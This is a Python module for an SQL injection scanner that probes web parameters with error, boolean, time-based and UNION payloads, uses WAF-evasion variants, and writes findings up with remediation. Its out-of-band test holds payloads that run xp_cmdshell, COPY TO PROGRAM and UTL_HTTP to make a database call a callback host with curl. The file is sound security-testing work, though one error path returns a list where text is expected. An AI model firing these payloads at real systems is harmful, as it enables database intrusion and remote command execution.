import re
import time
import json
import random
import urllib.parse
import urllib.request
import urllib.error

from scanners.base_scanner import BaseScanner
from scanners.core.confidence import ConfidenceTracker as CT
from utils.anomaly import TimingAnomalyDetector, SizeAnomalyDetector
from utils.evasion import waf_evade
from utils.callback import build_callback_url
from utils.payload_library import get_sql_payloads
from utils.multi_stage_detector import MultiStageDetector, PassiveAnalyzer, ActiveProber, ConfirmationTester


ERROR_PATTERNS = [
    (r"You have an error in your SQL syntax", "MySQL"),
    (r"Warning.*mysql_", "MySQL"),
    (r"MySQLSyntaxErrorException", "MySQL"),
    (r"valid MySQL result", "MySQL"),
    (r"PostgreSQL.*ERROR", "PostgreSQL"),
    (r"pg_query\(\).*failed", "PostgreSQL"),
    (r"PSQLException", "PostgreSQL"),
    (r"unterminated quoted string", "PostgreSQL"),
    (r"Microsoft OLE DB Provider for SQL Server", "MSSQL"),
    (r"Unclosed quotation mark after the character string", "MSSQL"),
    (r"Microsoft SQL Native Client error", "MSSQL"),
    (r"ODBC SQL Server Driver", "MSSQL"),
    (r"ORA-\d{5}", "Oracle"),
    (r"Oracle error", "Oracle"),
    (r"SQLite3::SQLException", "SQLite"),
    (r"SQLITE_ERROR", "SQLite"),
    (r"near \".*\": syntax error", "SQLite"),
    (r"SQL syntax.*MariaDB", "MariaDB"),
    (r"javax\.persistence\.PersistenceException", "JPA/Hibernate"),
    (r"org\.hibernate\.exception", "Hibernate"),
]

# Use advanced payload library
SQL_PAYLOADS = get_sql_payloads()
ERROR_PAYLOADS = SQL_PAYLOADS['error']
BOOLEAN_PAYLOADS = SQL_PAYLOADS['boolean']
TIME_PAYLOADS = SQL_PAYLOADS['time']
STACKED_PAYLOADS = SQL_PAYLOADS['stacked']
OOB_PAYLOADS = SQL_PAYLOADS['oob']

QUERY_PARAMS = [
    "id", "q", "search", "query", "page", "name", "user", "email",
    "cat", "category", "item", "product", "order", "sort", "filter",
    "type", "status", "action", "username", "password", "login",
]


class SqlInjectionScanner(BaseScanner):
    SCANNER_NAME = "SQL Injection Scanner"

    def __init__(self, scan_id, target, domain, **kwargs):
        super().__init__(scan_id, target, domain, **kwargs)
        self._tested = 0
        self._found = 0
        self._seen: set = set()

    def run(self) -> list:
        self.log("INFO", f"[SQLi] Starting SQL injection scan on {self.target}...")

        # GAP-ADV: Use centralized discovery context to avoid redundant crawls
        endpoints = []
        if self.discovery_context and "urls" in self.discovery_context:
            endpoints = [
                u.get("url") if isinstance(u, dict) else u
                for u in self.discovery_context["urls"]
                if u  # BUG-11 FIX: skip None entries
            ]

        if not endpoints:
            endpoints = [self.target]

        endpoints = list(set(filter(None, endpoints)))

        self.log("INFO", f"[SQLi] Testing {len(endpoints)} endpoint(s)")

        self._timing_detector = TimingAnomalyDetector()
        self._size_detector = SizeAnomalyDetector()

        try:
            for url in endpoints:
                self._test_endpoint(url)
        except Exception as e:
            self.log("WARNING", f"[SQLi] Error during scan: {e}")

        if not self.vulns:
            self._test_grammar_fuzz()
            self._test_oob_sqli()
            self._test_json_body_sqli()  # ENH: test JSON POST endpoints

        self._probe_common_params()

        self.log(
            "SUCCESS" if not self.vulns else "WARNING",
            f"[SQLi] Complete — {self._tested} probe(s) | {self._found} SQLi confirmed",
        )
        return self.vulns

    def _fetch(self, url: str, timeout: int = 10) -> str | None:
        try:
            req = urllib.request.Request(url, headers=self._make_headers())
            ctx = self.get_ssl_context()
            with urllib.request.urlopen(req, timeout=timeout, context=ctx) as r:
                return r.read().decode("utf-8", errors="ignore")
        except urllib.error.HTTPError as e:
            return e.read().decode("utf-8", errors="ignore")
        except Exception as e:
            self.log("ERROR", f"[SQLi] _fetch error: {e}")
            return self.vulns
    def _test_endpoint(self, url: str):
        parsed = urllib.parse.urlparse(url)
        qs = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)
        params = list(qs.keys()) if qs else QUERY_PARAMS[:8]

        for param in params:
            if self._test_parameter(url, parsed, param):
                break

    def _test_parameter(self, url: str, parsed, param: str) -> bool:
        base = urllib.parse.urlunparse(parsed._replace(query="", fragment=""))

        for p in ERROR_PAYLOADS:
            for eva_name, eva_payload in waf_evade(p):
                test_url = f"{base}?{urllib.parse.urlencode({param: eva_payload})}"
                body, status = self._make_request(test_url)
                self._tested += 1
                if body:
                    for pattern, db_name in ERROR_PATTERNS:
                        if re.search(pattern, body, re.IGNORECASE):
                            self._report_error(url, param, eva_payload, db_name, test_url)
                            return True

        for true_payload, false_payload in BOOLEAN_PAYLOADS:
            self._tested += 1
            true_url = f"{base}?{urllib.parse.urlencode({param: true_payload})}"
            false_url = f"{base}?{urllib.parse.urlencode({param: false_payload})}"
            true_body = self._fetch(true_url)
            false_body = self._fetch(false_url)
            if true_body and false_body:
                t_len, f_len = len(true_body), len(false_body)
                # BUG-9 FIX: Use pair_differs() heuristic before statistical baseline.
                # Previously called test_size() with only 2 samples recorded, which
                # caused stdev=0 and z-score=0 — always returning False (missed vulns).
                if self._size_detector.pair_differs(t_len, f_len, min_diff=50):
                    self._report_boolean(url, param, true_payload, false_payload, true_url)
                    return True
                # Also record for statistical baseline building
                self._size_detector.record_size(t_len)
                self._size_detector.record_size(f_len)

        # BUG-8 FIX: build_baseline() expects request_fn(url, method, data, headers, timeout).
        # Using a lambda that passes all positional args to avoid keyword-mismatch.
        self._timing_detector.build_baseline(
            lambda u, m, d, h, t: self._make_request(u, m, d, h, t),
            base, n=5
        )
        for payload, threshold in TIME_PAYLOADS:
            self._tested += 1
            test_url = f"{base}?{urllib.parse.urlencode({param: payload})}"
            start = time.time()
            self._fetch(test_url, timeout=max(threshold * 2 + 2, 10))
            elapsed = time.time() - start
            if self._timing_detector.test_payload(f"time_{param}", elapsed, payload, z_threshold=2.5) and elapsed >= threshold:
                self._report_time(url, param, payload, elapsed, test_url)
                return True

        return False

    def _test_grammar_fuzz(self):
        parsed = urllib.parse.urlparse(self.target)
        qs = urllib.parse.parse_qsl(parsed.query)
        if not qs:
            return
        base = urllib.parse.urlunparse(parsed._replace(query="", fragment=""))
        for k, _ in qs[:3]:
            for num_cols in random.sample(range(1, 51), min(10, 50)):
                nulls = ", ".join(["NULL"] * num_cols)
                payload = f"' UNION SELECT {nulls} --"
                for eva_name, eva_payload in waf_evade(payload):
                    test_url = f"{base}?{urllib.parse.urlencode({k: eva_payload})}"
                    body, status = self._make_request(test_url)
                    self._tested += 1
                    if body and status == 200:
                        for pattern, db_name in ERROR_PATTERNS:
                            if re.search(pattern, body, re.IGNORECASE):
                                self._report_error(self.target, k, eva_payload, db_name, test_url)
                                return

    def _test_oob_sqli(self):
        parsed = urllib.parse.urlparse(self.target)
        qs = urllib.parse.parse_qsl(parsed.query)
        if not qs:
            return
        callback = build_callback_url("/sqli-oob")
        oob_payloads = [
            f"'; EXEC xp_cmdshell('curl {callback}'); --",
            f"'; DECLARE @q varchar(8000); SET @q=0x6375726C; EXEC xp_cmdshell(@q+CHAR(32)+'{callback}'); --",
            f"' OR UTL_HTTP.REQUEST('{callback}') = 1 --",
            f"' || UTL_HTTP.REQUEST('{callback}') || '",
            f"' COPY (SELECT 1) TO PROGRAM 'curl {callback}' --",
        ]
        base = urllib.parse.urlunparse(parsed._replace(query="", fragment=""))
        for k, _ in qs[:2]:
            for oob_payload in oob_payloads:
                test_url = f"{base}?{urllib.parse.urlencode({k: oob_payload})}"
                body, status = self._make_request(test_url)
                self._tested += 1

    def _test_json_body_sqli(self):
        """
        ENH: Test JSON POST body parameters for SQL injection.
        Many modern APIs accept JSON and may pass values directly to SQL queries.
        """
        json_fields = ["id", "user_id", "user", "email", "search", "q", "filter"]
        for field in json_fields:
            for payload in ERROR_PAYLOADS[:5]:
                try:
                    body_data = json.dumps({field: payload}).encode()
                    body, status = self._make_request(
                        self.target, "POST", body_data,
                        {"Content-Type": "application/json"}
                    )
                    self._tested += 1
                    if body:
                        for pattern, db_name in ERROR_PATTERNS:
                            if re.search(pattern, body, re.IGNORECASE):
                                self._report_error(self.target, field, payload, db_name, self.target)
                                return
                except Exception:
                    pass

    def _probe_common_params(self):
        base = self.target.rstrip("/")
        reqs = []
        for param in QUERY_PARAMS[:5]:
            for payload in ERROR_PAYLOADS[:3]:
                test_url = f"{base}?{param}={urllib.parse.quote(payload)}"
                reqs.append({"url": test_url, "param": param, "payload": payload, "timeout": 5})
        
        results = self._make_async_requests(reqs)
        self._tested += len(reqs)
        
        for req_dict, body, status in results:
            if body:
                for pattern, db_name in ERROR_PATTERNS:
                    if re.search(pattern, body, re.IGNORECASE):
                        self._report_error(
                            self.target, req_dict["param"], req_dict["payload"], db_name, req_dict["url"],
                        )
                        return

    def _report_error(self, url, param, payload, db_name, test_url):
        key = f"{url}:{param}:{db_name}"
        if key in self._seen:
            return
        self._seen.add(key)
        self._found += 1
        self.log("CRITICAL", f"[SQLi] {db_name} error-based injection via '{param}'")
        self.add_vuln(
            title=f"SQL Injection — {db_name} Error-Based via '{param}'",
            severity="Critical",
            category="Injection",
            cvss_score=9.8,
            cwe_ids=["CWE-89"],
            owasp_category="A03:2021 – Injection",
            description=(
                f"A SQL injection vulnerability was confirmed at `{url}` "
                f"via the `{param}` parameter. The server returned a **{db_name}** "
                f"database error message, confirming unsanitized input in SQL queries."
            ),
            remediation=(
                "1. Use parameterized queries / prepared statements exclusively.\n"
                "2. Use an ORM that handles parameterization.\n"
                "3. Apply strict input validation.\n"
                "4. Apply least-privilege to database accounts.\n"
                "5. Deploy a WAF as defense-in-depth."
            ),
            payload=payload,
            evidence=f"Database error: {db_name}",
            request_details=f"GET {test_url}",
        )

    def _report_boolean(self, url, param, true_payload, false_payload, test_url):
        key = f"{url}:{param}:boolean"
        if key in self._seen:
            return
        self._seen.add(key)
        self._found += 1
        # PHASE 3: Boolean-based is LIKELY — length diff alone is not definitive proof
        # (network jitter, server-side caching, or content negotiation can cause this).
        # User should manually verify or run with --confirm flag.
        sev, cvss_capped, conf = CT.apply("Critical", 9.8, CT.LIKELY)
        self.log("WARNING", f"[SQLi] Likely boolean-based blind injection via '{param}' (LIKELY — needs verification)")
        self.add_vuln(
            title=f"SQL Injection (Likely) — Boolean-Based Blind via '{param}'",
            severity=sev,
            category="Injection",
            cvss_score=cvss_capped,
            cwe_ids=["CWE-89"],
            owasp_category="A03:2021 – Injection",
            confidence=conf,
            description=(
                f"A **{conf}** boolean-based blind SQL injection indicator was detected at `{url}` "
                f"via the `{param}` parameter. True/false conditions produced "
                f"different response lengths (min diff: 50 bytes).\n\n"
                f"**Confidence: {conf}** — response-length differences can be caused by "
                f"network jitter, server-side caching, or content negotiation. "
                f"Manual verification is required: confirm that the same true/false pattern "
                f"reproduces consistently across 3+ independent requests."
            ),
            remediation=(
                "1. Use parameterized queries.\n"
                "2. Ensure error messages do not reveal query state.\n"
                "3. Implement WAF rules for inference patterns.\n"
                "4. Manually verify: test true/false payloads 3x to confirm reproducibility."
            ),
            payload=f"TRUE:{true_payload} / FALSE:{false_payload}",
            evidence=f"Response length differs between true/false conditions (confidence: {conf})",
            request_details=f"GET {test_url}",
        )

    def _report_time(self, url, param, payload, elapsed, test_url):
        key = f"{url}:{param}:time"
        if key in self._seen:
            return
        self._seen.add(key)
        self._found += 1
        # PHASE 3: Time-based single shot is LIKELY — a single timing anomaly can be
        # caused by server load, network variance, or CDN throttling.
        sev, cvss_capped, conf = CT.apply("Critical", 9.8, CT.LIKELY)
        self.log("WARNING", f"[SQLi] Likely time-based blind injection via '{param}' ({elapsed:.1f}s) — single shot")
        self.add_vuln(
            title=f"SQL Injection (Likely) — Time-Based Blind via '{param}'",
            severity=sev,
            category="Injection",
            cvss_score=cvss_capped,
            cwe_ids=["CWE-89"],
            owasp_category="A03:2021 – Injection",
            confidence=conf,
            description=(
                f"A **{conf}** time-based blind SQL injection indicator was detected at `{url}` "
                f"via the `{param}` parameter. The payload caused a `{elapsed:.1f}s` delay.\n\n"
                f"**Confidence: {conf}** — a single timing anomaly can be caused by server load, "
                f"network latency spikes, or CDN throttling. "
                f"Manual verification is required: reproduce this timing delay 3x to confirm."
            ),
            remediation=(
                "1. Use parameterized queries.\n"
                "2. Set aggressive query timeouts at DB layer.\n"
                "3. WAF rules for SLEEP/WAITFOR/BENCHMARK patterns.\n"
                "4. Manually verify: reproduce the timing delay 3+ times from a clean connection."
            ),
            payload=payload,
            evidence=f"Response delay: {elapsed:.1f}s (confidence: {conf})",
            request_details=f"GET {test_url}",
        )

